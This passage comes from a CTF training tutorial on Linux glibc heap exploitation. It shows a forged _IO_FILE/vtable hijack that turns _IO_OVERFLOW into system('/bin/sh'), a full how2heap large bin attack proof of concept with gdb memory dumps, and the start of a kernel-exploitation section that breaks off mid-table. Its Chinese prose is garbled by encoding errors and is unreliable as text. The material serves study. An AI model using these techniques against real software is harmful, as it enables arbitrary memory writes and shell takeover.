           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
#endif
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     // å°†å…¶ä¿®æ”¹ä¸º system å‡½æ•°
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp-&gt;_chain;    // æŒ‡å‘æˆ‘ä»¬æŒ‡å®šçš„åŒºåŸŸ
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
</code></pre>
<p><code>_IO_list_all</code> æ˜¯ä¸€ä¸ª <code>_IO_FILE_plus</code> ç±»åž‹çš„å¯¹è±¡ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯å°† <code>_IO_list_all</code> æŒ‡é’ˆæ”¹å†™ä¸ºä¸€ä¸ªä¼ªé€ çš„æŒ‡é’ˆï¼Œå®ƒçš„ <code>_IO_OVERFLOW</code> æŒ‡å‘ systemï¼Œå¹¶ä¸”å‰ 8 å­—èŠ‚è¢«è®¾ç½®ä¸º '/bin/sh'ï¼Œæ‰€ä»¥å¯¹ <code>_IO_OVERFLOW(fp, EOF)</code> çš„è°ƒç”¨æœ€ç»ˆä¼šå˜æˆå¯¹ <code>system('/bin/sh')</code> çš„è°ƒç”¨ã€‚</p>
<pre><code class="language-c">// libio/libioP.h
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

// libio/libio.h
struct _IO_FILE {
  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;    /* Current read pointer */
  char* _IO_read_end;    /* End of get area. */
  char* _IO_read_base;    /* Start of putback+get area. */
  char* _IO_write_base;    /* Start of put area. */
  char* _IO_write_ptr;    /* Current put pointer. */
  char* _IO_write_end;    /* End of put area. */
  char* _IO_buf_base;    /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
</code></pre>
<p>å…¶ä¸­æœ‰ä¸€ä¸ªæŒ‡å‘å‡½æ•°è·³è½¬è¡¨çš„æŒ‡é’ˆï¼Œ<code>_IO_jump_t</code> çš„ç»“æž„å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">// libio/libioP.h
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
</code></pre>
<p>ä¼ªé€  <code>_IO_jump_t</code> ä¸­çš„ <code>__overflow</code> ä¸º system å‡½æ•°çš„åœ°å€ï¼Œä»Žè€Œè¾¾åˆ°æ‰§è¡Œ shell çš„ç›®çš„ã€‚</p>
<p>å½“å‘ç”Ÿå†…å­˜é”™è¯¯è¿›å…¥ <code>_IO_flush_all_lockp</code> åŽï¼Œ<code>_IO_list_all</code> ä»ç„¶æŒ‡å‘ unsorted binï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæˆ‘ä»¬èƒ½æŽ§åˆ¶çš„åœ°å€ã€‚æ‰€ä»¥éœ€è¦é€šè¿‡ <code>fp-&gt;_chain</code> æ¥å°† fp æŒ‡å‘æˆ‘ä»¬èƒ½æŽ§åˆ¶çš„åœ°æ–¹ã€‚æ‰€ä»¥å°† size å­—æ®µè®¾ç½®ä¸º 0x61ï¼Œå› ä¸ºæ­¤æ—¶ <code>_IO_list_all</code> æ˜¯ <code>&amp;unsorted_bin-0x10</code>ï¼Œåç§» 0x60 ä½ç½®ä¸Šæ˜¯ smallbins[5]ã€‚æ­¤æ—¶ï¼Œå¦‚æžœè§¦å‘ä¸€ä¸ªä¸é€‚åˆçš„ small chunk åˆ†é…ï¼Œmalloc å°±ä¼šå°† old top ä»Ž unsorted bin æ”¾å›ž smallbins[5] ä¸­ã€‚è€Œåœ¨ <code>_IO_FILE</code> ç»“æž„ä¸­ï¼Œåç§» 0x60 æŒ‡å‘ <code>struct _IO_marker *_markers</code>ï¼Œåç§» 0x68 æŒ‡å‘ <code>struct _IO_FILE *_chain</code>ï¼Œè¿™ä¸¤ä¸ªå€¼æ­£å¥½æ˜¯ old top çš„èµ·å§‹åœ°å€ã€‚è¿™æ · fp å°±æŒ‡å‘äº† old topï¼Œè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬èƒ½å¤ŸæŽ§åˆ¶çš„åœ°å€ã€‚</p>
<p>åœ¨å°† <code>_IO_OVERFLOW</code> ä¿®æ”¹ä¸º system çš„æ—¶å€™ï¼Œæœ‰ä¸€äº›æ¡ä»¶æ£€æŸ¥ï¼š</p>
<pre><code class="language-c">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
#endif
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     // éœ€è¦ä¿®æ”¹ä¸º system å‡½æ•°
// libio/libio.h

  struct _IO_wide_data *_wide_data;

/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
</code></pre>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®¾ç½® <code>fp-&gt;_mode = 0</code>ï¼Œ<code>fp-&gt;_IO_write_base = (char *) 2</code> å’Œ <code>fp-&gt;_IO_write_ptr = (char *) 3</code>ï¼Œä»Žè€Œç»•è¿‡æ£€æŸ¥ã€‚</p>
<p>ç„¶åŽï¼Œå°±æ˜¯ä¿®æ”¹ <code>_IO_jump_t</code>ï¼Œå°†å…¶æŒ‡å‘ winnerï¼š</p>
<pre><code class="language-text">gefâž¤  x/30gx p1-0x10+0x400
0x602400:    0x0068732f6e69622f    0x0000000000000061  &lt;-- old top
0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd2510      &lt;-- bk points to io_list_all-0x10
0x602420:    0x0000000000000002    0x0000000000000003      &lt;-- _IO_write_base, _IO_write_ptr
0x602430:    0x0000000000000000    0x0000000000000000
0x602440:    0x0000000000000000    0x0000000000000000
0x602450:    0x0000000000000000    0x0000000000000000
0x602460:    0x0000000000000000    0x0000000000000000
0x602470:    0x0000000000000000    0x00000000004006d3      &lt;-- winner
0x602480:    0x0000000000000000    0x0000000000000000
0x602490:    0x0000000000000000    0x0000000000000000
0x6024a0:    0x0000000000000000    0x0000000000000000
0x6024b0:    0x0000000000000000    0x0000000000000000
0x6024c0:    0x0000000000000000    0x0000000000000000
0x6024d0:    0x0000000000000000    0x0000000000602460      &lt;-- vtable
0x6024e0:    0x0000000000000000    0x0000000000000000
gefâž¤  p *((struct _IO_FILE_plus *) 0x602400)
$1 = {
  file = {
    _flags = 0x6e69622f,
    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020@b&quot;,
    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;,
    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x4006d3,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = &quot;&quot;,
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = '\000' &lt;repeats 19 times&gt;
  },
  vtable = 0x602460
}
</code></pre>
<p>æœ€åŽéšæ„åˆ†é…ä¸€ä¸ª chunkï¼Œç”±äºŽ <code>size&lt;= 2*SIZE_SZ</code>ï¼Œæ‰€ä»¥ä¼šè§¦å‘ <code>_IO_flush_all_lockp</code> ä¸­çš„ <code>_IO_OVERFLOW</code> å‡½æ•°ï¼ŒèŽ·å¾— shellã€‚</p>
<pre><code class="language-c">  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
        {
          bck = victim-&gt;bk;
          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))
            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,
                             chunk2mem (victim), av);
          size = chunksize (victim);
</code></pre>
<p>åˆ°æ­¤ï¼Œhow2heap é‡Œå…¨éƒ¨çš„å †åˆ©ç”¨æ–¹æ³•å°±å…¨éƒ¨è®²å®Œäº†ã€‚</p>
<h2 id="319-linux">3.1.9 Linux å †åˆ©ç”¨ï¼ˆå››ï¼‰</h2>
<ul>
<li>how2heap</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.9_heap_exploit_4.html#large_bin_attack">large_bin_attack</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.9_heap_exploit_4.html#house_of_rabbit">house_of_rabbit</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.9_heap_exploit_4.html#house_of_roman">house_of_roman</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.9_heap_exploit_4.html#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></li>
</ul>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/Others/3.1.6_heap_exploit">ä¸‹è½½æ–‡ä»¶</a></p>
<h2 id="how2heap_3">how2heap</h2>
<h3 id="large_bin_attack">large_bin_attack</h3>
<pre><code class="language-c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main() {
    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, &quot;The targets we want to rewrite on stack:\n&quot;);
    fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
    fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x100);
    fprintf(stderr, &quot;Now, we allocate the first chunk: %p\n&quot;, p1 - 2);
    malloc(0x10);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, &quot;Then, we allocate the second chunk(large chunk): %p\n&quot;, p2 - 2);
    malloc(0x10);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, &quot;Finally, we allocate the third chunk(large chunk): %p\n\n&quot;, p3 - 2);
    malloc(0x10);

    // deal with tcache - libc-2.26
    // int *a[10], *b[10], i;
    // for (i = 0; i &lt; 7; i++) {
    //     a[i] = malloc(0x100);
    //     b[i] = malloc(0x400);
    // }
    // for (i = 0; i &lt; 7; i++) {
    //     free(a[i]);
    //     free(b[i]);
    // }

    free(p1);
    free(p2);
    fprintf(stderr, &quot;Now, We free the first and the second chunks now and they will be inserted in the unsorted bin\n&quot;);

    malloc(0x30);
    fprintf(stderr, &quot;Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist\n\n&quot;);

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&amp;stack_var1 - 2);
    p2[3] = (unsigned long)(&amp;stack_var2 - 4);
    fprintf(stderr, &quot;Now we use a vulnerability to overwrite the freed second chunk\n\n&quot;);

    free(p3);
    malloc(0x30);
    fprintf(stderr, &quot;Finally, we free the third chunk and malloc again, targets should have already been rewritten:\n&quot;);
    fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
    fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
}
$ gcc -g large_bin_attack.c
$ ./a.out 
The targets we want to rewrite on stack:
stack_var1 (0x7fffffffdeb0): 0
stack_var2 (0x7fffffffdeb8): 0

Now, we allocate the first chunk: 0x555555757000
Then, we allocate the second chunk(large chunk): 0x555555757130
Finally, we allocate the third chunk(large chunk): 0x555555757560

Now, We free the first and the second chunks now and they will be inserted in the unsorted bin
Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist

Now we use a vulnerability to overwrite the freed second chunk

Finally, we free the third chunk and malloc again, targets should have already been rewritten:
stack_var1 (0x7fffffffdeb0): 0x555555757560
stack_var2 (0x7fffffffdeb8): 0x555555757560
</code></pre>
<p>è¯¥æŠ€æœ¯å¯ç”¨äºŽä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä¾‹å¦‚æ ˆä¸Šçš„å˜é‡ stack_var1 å’Œ stack_var2ã€‚åœ¨å®žè·µä¸­å¸¸å¸¸ä½œä¸ºå…¶ä»–æ¼æ´žåˆ©ç”¨çš„å‰å¥ï¼Œä¾‹å¦‚åœ¨ fastbin attack ä¸­ç”¨äºŽä¿®æ”¹å…¨å±€å˜é‡ global_max_fast ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬åˆ†é… chunk p1, p2 å’Œ p3ï¼Œå¹¶ä¸”åœ¨å®ƒä»¬ä¹‹é—´æ’å…¥å…¶ä»–çš„ chunk ä»¥é˜²æ­¢åœ¨é‡Šæ”¾æ—¶è¢«åˆå¹¶ã€‚æ­¤æ—¶çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">gefâž¤  x/2gx &amp;stack_var1 
0x7fffffffde70:    0x0000000000000000    0x0000000000000000
gefâž¤  x/4gx p1-2
0x555555757000:    0x0000000000000000    0x0000000000000111  &lt;-- p1
0x555555757010:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p2-6
0x555555757110:    0x0000000000000000    0x0000000000000021
0x555555757120:    0x0000000000000000    0x0000000000000000
0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2
0x555555757140:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p3-6
0x555555757540:    0x0000000000000000    0x0000000000000021
0x555555757550:    0x0000000000000000    0x0000000000000000
0x555555757560:    0x0000000000000000    0x0000000000000411  &lt;-- p3
0x555555757570:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p3+(0x410/8)-2
0x555555757970:    0x0000000000000000    0x0000000000000021
0x555555757980:    0x0000000000000000    0x0000000000000000
0x555555757990:    0x0000000000000000    0x0000000000020671  &lt;-- top
0x5555557579a0:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>ç„¶åŽä¾æ¬¡é‡Šæ”¾æŽ‰ p1 å’Œ p2ï¼Œè¿™ä¸¤ä¸ª free chunk å°†è¢«æ”¾å…¥ unsorted binï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx p1-2
0x555555757000:    0x0000000000000000    0x0000000000000111  &lt;-- p1 [be freed]
0x555555757010:    0x00007ffff7dd3b78    0x0000555555757130
0x555555757020:    0x0000000000000000    0x0000000000000000
0x555555757030:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p2-2
0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2 [be freed]
0x555555757140:    0x0000555555757000    0x00007ffff7dd3b78
0x555555757150:    0x0000000000000000    0x0000000000000000
0x555555757160:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x555555757130, bk=0x555555757000
 â†’   Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE)   â†’   Chunk(addr=0x555555757010, size=0x110, flags=PREV_INUSE)
[+] Found 2 chunks in unsorted bin.
</code></pre>
<p>æŽ¥ä¸‹æ¥éšä¾¿ malloc ä¸€ä¸ª chunkï¼Œåˆ™ p1 è¢«åˆ‡åˆ†ä¸ºä¸¤å—ï¼Œä¸€å—ä½œä¸ºåˆ†é…çš„ chunk è¿”å›žï¼Œå‰©ä¸‹çš„ä¸€å—ç»§ç»­ç•™åœ¨ unsorted binï¼ˆp1 çš„ä½œç”¨å°±åœ¨è¿™é‡Œï¼Œå¦‚æžœæ²¡æœ‰ p1ï¼Œé‚£ä¹ˆåˆ‡åˆ†çš„å°†æ˜¯ p2ï¼‰ã€‚è€Œ p2 åˆ™è¢«æ•´ç†å›žå¯¹åº”çš„ large bin é“¾è¡¨ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/14gx p1-2
0x555555757000:    0x0000000000000000    0x0000000000000041  &lt;-- p1-1
0x555555757010:    0x00007ffff7dd3c78    0x00007ffff7dd3c78
0x555555757020:    0x0000000000000000    0x0000000000000000
0x555555757030:    0x0000000000000000    0x0000000000000000
0x555555757040:    0x0000000000000000    0x00000000000000d1  &lt;-- p1-2 [be freed]
0x555555757050:    0x00007ffff7dd3b78    0x00007ffff7dd3b78      &lt;-- fd, bk
0x555555757060:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p2-2
0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2 [be freed]
0x555555757140:    0x00007ffff7dd3f68    0x00007ffff7dd3f68      &lt;-- fd, bk
0x555555757150:    0x0000555555757130    0x0000555555757130      &lt;-- fd_nextsize, bk_nextsize
0x555555757160:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x555555757040, bk=0x555555757040
 â†’   Chunk(addr=0x555555757050, size=0xd0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
gefâž¤  heap bins large
[ Large Bins for arena 'main_arena' ]
[+] large_bins[63]: fw=0x555555757130, bk=0x555555757130
 â†’   Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE)
[+] Found 1 chunks in 1 large non-empty bins.
</code></pre>
<p>æ•´ç†çš„è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ large bins ä¸­ chunk æŒ‰ fd æŒ‡é’ˆçš„é¡ºåºä»Žå¤§åˆ°å°æŽ’åˆ—ï¼Œå¦‚æžœå¤§å°ç›¸åŒåˆ™æŒ‰ç…§æœ€è¿‘ä½¿ç”¨é¡ºåºæŽ’åˆ—ï¼š</p>
<pre><code class="language-c">          /* place chunk in bin */

          if (in_smallbin_range (size))
            {
                [ ... ]
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck-&gt;fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))
                    {
                        [ ... ]
                    }
                  else
                    {
                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size &lt; fwd-&gt;size)
                        {
                            [ ... ]
                        }

                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)
                        [ ... ]
                      else
                        {
                          victim-&gt;fd_nextsize = fwd;
                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                          fwd-&gt;bk_nextsize = victim;
                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                        }
                      bck = fwd-&gt;bk;
                    }
                }
              else
                [ ... ]
            }

          mark_bin (av, victim_index);
          victim-&gt;bk = bck;
          victim-&gt;fd = fwd;
          fwd-&gt;bk = victim;
          bck-&gt;fd = victim;
</code></pre>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¼æ´žï¼Œå¯ä»¥å¯¹ large bin é‡Œçš„ chunk p2 è¿›è¡Œä¿®æ”¹ï¼Œç»“åˆä¸Šé¢çš„æ•´ç†è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¼ªé€  p2 å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx p2-2
0x555555757130:    0x0000000000000000    0x00000000000003f1  &lt;-- fake p2 [be freed]
0x555555757140:    0x0000000000000000    0x00007fffffffde60      &lt;-- bk
0x555555757150:    0x0000000000000000    0x00007fffffffde58      &lt;-- bk_nextsize
0x555555757160:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>åŒæ ·çš„ï¼Œé‡Šæ”¾ p3ï¼Œå°†å…¶æ”¾å…¥ unsorted binï¼Œç´§æŽ¥ç€è¿›è¡Œ malloc æ“ä½œï¼Œå°† p3 æ•´ç†å›ž large binï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­åˆ¤æ–­æ¡ä»¶ <code>(unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)</code> ä¸ºå‡ï¼Œç¨‹åºå°†è¿›å…¥ else åˆ†æ”¯ï¼Œå…¶ä¸­ <code>fwd</code> æ˜¯ fake p2ï¼Œ<code>victim</code> æ˜¯ p3ï¼ŒæŽ¥ç€ <code>bck</code> è¢«èµ‹å€¼ä¸º (&amp;stack_var1 - 2)ã€‚</p>
<p>åœ¨ p3 è¢«æ”¾å›ž large bin å¹¶æŽ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½äºŽæ ˆä¸Šçš„ä¸¤ä¸ªå˜é‡ä¹Ÿè¢«ä¿®æ”¹æˆäº† <code>victim</code>ï¼Œå¯¹åº”çš„è¯­å¥åˆ†åˆ«æ˜¯ <code>bck-&gt;fd = victim;</code> å’Œ <code>ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>ã€‚</p>
<pre><code class="language-text">gefâž¤  x/2gx &amp;stack_var1 
0x7fffffffde70:    0x0000555555757560    0x0000555555757560
gefâž¤  x/8gx p2-2
0x555555757130:    0x0000000000000000    0x00000000000003f1
0x555555757140:    0x0000000000000000    0x0000555555757560
0x555555757150:    0x0000000000000000    0x0000555555757560
0x555555757160:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx p3-2
0x555555757560:    0x0000000000000000    0x0000000000000411
0x555555757570:    0x0000555555757130    0x00007fffffffde60
0x555555757580:    0x0000555555757130    0x00007fffffffde58
0x555555757590:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>è€ƒè™‘ libc-2.26 ä¸Šçš„æƒ…å†µï¼Œè¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¤„ç†å¥½ tchache å°±å¯ä»¥äº†ï¼Œåœ¨ free ä¹‹å‰æŠŠä¸¤ç§å¤§å°çš„ tcache bin éƒ½å æ»¡ã€‚</p>
<h2 id="3111-linux">3.1.11 Linux å†…æ ¸æ¼æ´žåˆ©ç”¨</h2>
<ul>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.11_linux_kernel_exploit.html#ä»Žç”¨æˆ·æ€åˆ°å†…æ ¸æ€">ä»Žç”¨æˆ·æ€åˆ°å†…æ ¸æ€</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.11_linux_kernel_exploit.html#å†…æ ¸æ¼æ´žåˆ†ç±»">å†…æ ¸æ¼æ´žåˆ†ç±»</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.11_linux_kernel_exploit.html#å†…æ ¸åˆ©ç”¨æ–¹æ³•">å†…æ ¸åˆ©ç”¨æ–¹æ³•</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.11_linux_kernel_exploit.html#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></li>
</ul>
<h2 id="_25">ä»Žç”¨æˆ·æ€åˆ°å†…æ ¸æ€</h2>
<table>
<thead>
<tr>
<th>ä¼å›¾</th>
<th>ç”¨æˆ·æ€æ¼æ´žåˆ©ç”¨</th>
<th>å†…æ ¸æ€æ¼æ´žåˆ©ç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>è›®åŠ›æ³•åˆ©ç”¨æ¼æ´ž</td>
<td>åº”ç”¨ç¨‹åºå¯ä»¥å¤šæ¬¡å´©æºƒå¹¶é‡å¯ï¼ˆæˆ–è‡ªåŠ¨é‡å¯ï¼‰</td>
<td>è¿™å°†å¯¼è‡´æœºå™¨é™·å…¥ä¸ä¸€è‡´çš„çŠ¶æ€ï¼Œé€šå¸¸ä¼šå¯¼è‡´æ­»æœºæˆ–é‡å¯</td>
</tr>
<tr>
<td>å½±å“ç›®æ ‡ç¨‹åº</td>
<td>æ”»å‡»è€…å¯¹è¢«æ”»å‡»ç¨‹åºï¼ˆç‰¹åˆ«æ˜¯æœ¬åœ°æ”»å‡»ï¼‰æ‹¥æœ‰æ›´å¤šçš„æŽ§åˆ¶ï¼ˆä¾‹å¦‚æ”»å‡»è€…å¯ä»¥è®¾ç½®è¢«æ”»å‡»ç¨‹åºçš„è¿è¡ŒçŽ¯å¢ƒï¼‰ã€‚è¢«æ”»å‡»ç¨‹åºæ˜¯å®ƒçš„åº“å­ç³»ç»Ÿçš„å”¯ä¸€ä½¿ç”¨è€…ï¼ˆä¾‹å¦‚å†…å­˜åˆ†é…è¡¨ï¼‰</td>
<td>æ”»å‡»è€…éœ€è¦å’Œå…¶ä»–æ‰€æœ‰æ¬²â€œå½±å“â€å†…æ ¸çš„åº”ç”¨ç¨‹åºç«žäº‰ã€‚æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½æ˜¯å†…æ ¸å­ç³»ç»Ÿçš„ä½¿ç”¨è€…</td>
</tr>
<tr>
<td>æ‰§è¡Œ shellcode</td>
<td>shellcode å¯ä»¥åˆ©ç”¨å·²ç»é€šè¿‡å®‰å…¨å’Œæ­£ç¡®æ€§ä¿è¯çš„ç”¨æˆ·æ€é—¨æ¥è¿›è¡Œå†…æ ¸ç³»ç»Ÿè°ƒç”¨</td>
<td>shellcode åœ¨æ›´é«˜çš„æƒé™çº§åˆ«ä¸Šæ‰§è¡Œï¼Œå¹¶ä¸”å¿…é¡»åœ¨ä¸æƒŠåŠ¨ç³»ç»Ÿçš„æƒ…å†µä¸‹æ­£ç¡®åœ°è¿”å›žåˆ°åº”ç”¨ç¨‹åº</td>
</tr>
<tr>
